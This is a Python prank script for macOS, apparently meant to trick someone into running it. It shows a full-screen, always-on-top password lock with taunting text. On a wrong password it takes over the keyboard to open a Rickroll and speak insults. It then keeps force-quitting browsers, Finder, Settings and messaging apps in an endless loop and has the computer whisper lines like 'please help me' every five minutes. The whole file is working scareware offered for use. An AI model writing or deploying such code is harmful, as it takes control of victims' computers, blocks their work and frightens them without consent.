import os
import time
import tkinter as tk
import subprocess
from pynput.keyboard import Key, Controller

os.system('osascript -e "set Volume 5"')
os.system("say Up and running ")

def run_command_in_background(command):
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def run_command_in_background2(command2):
    subprocess.Popen(command2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def toggle_flash():
    global flash_status
    if flash_status:
        label.config(fg='red', bg='black')
    else:
        label.config(fg='black', bg='red')
    flash_status = not flash_status
    root.after(500, toggle_flash)

def submit_password(event=None):
    global access
    password = password_entry.get()
    if password.lower() == "t":
        access = True
        root.destroy()
    else:
        password_result.config(text="Incorrect Password!", fg="red")
        HELL()
import psutil
def HELL():
    
    os.system('open -a "Google Chrome.app"')
    time.sleep(1)
    keyboard.press(Key.cmd)
    keyboard.press('t')
    keyboard.release(Key.cmd)
    keyboard.release('t')
    time.sleep(1)
    keyboard.type('https://en.wikipedia.org/wiki/Monkey_selfie_copyright_dispute')
    time.sleep(1)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(5)
    command_to_run2 = 'osascript -e "set Volume 5"'
    run_command_in_background2(command_to_run2)

    os.system('say get wrecked, Hedger-clan for the win')

    os.system('open -a "Google Chrome.app"')
    time.sleep(1)
    keyboard.press(Key.cmd)
    keyboard.press('t')
    keyboard.release(Key.cmd)
    keyboard.release('t')
    time.sleep(1)
    keyboard.type('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley')
    time.sleep(1)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(3)
    keyboard.press('f')
    keyboard.release('f')
    keyboard.press(Key.cmd)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.press('a')
    keyboard.release('a')
    keyboard.press('o')
    keyboard.release('o')
    keyboard.release(Key.cmd)
os.system('ipconfig getifaddr en0')

root = tk.Tk()
root.title("Flashing Text and Password")
root.attributes('-fullscreen', True)

password_entry = tk.Entry(root, show="*", font=("Helvetica", 24))
password_entry.pack(side=tk.TOP)

password_result = tk.Label(root, text="", font=("Helvetica", 25))
password_result.pack(side=tk.TOP)

label_above = tk.Label(root, text="^^^^^^^ input the password ABOVE correctly or cry ^^^^^^^", font=("Helvetica", 30))
label_center = tk.Label(root, text="you fell for something Hedgerclan made... lol", font=("Helvetica", 30))
label_below = tk.Label(root, text="MADE BY Hedgerclan", font=("Helvetica", 30))
label_above.pack(side=tk.TOP)
label_center.pack(side=tk.TOP)
label_below.pack(side=tk.BOTTOM)

label = tk.Label(root, text="WARNING getting the password wrong will cause issues", font=("Helvetica", 35))
label.pack(side=tk.TOP)

flash_status = True
toggle_flash()

keyboard = Controller()

password_entry.bind("<Return>", submit_password)

root.overrideredirect(True)
root.attributes("-topmost", True)
root.focus_force()

root.mainloop()

if access == True:
    print('Have a good day!')
    os.system('say Apologies, Have a good day')
elif access != True:
    HELL()
    


    app_names = ["Google Chrome", "Safari", "Music", "System Settings", "Finder", "Spotify", "Arc", "Steam", "Epic Games", "News", "Notes", "Calendar", "Mail", "Bin", "Opera", "Discord", "Photo Booth", "QuickTime Player", "Facetime", "Messages", "Photos"]

    while True:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in app_names:
                print(f"{proc.info['name']} is running or starting, closing it...")
                subprocess.call(['osascript', '-e', f'tell application "{proc.info["name"]}" to quit'])

        time.sleep(5)
        os.system("WORDS=('please help me' 'i am so alone' 'i am lonely' 'pssssst' 'hello' 'hey, listen.'); while [ 1 = 1 ]; do say '${WORDS[$[ $[ RANDOM % ${#WORDS[@]} ]]]}' -v Whisper; sleep 300; done")
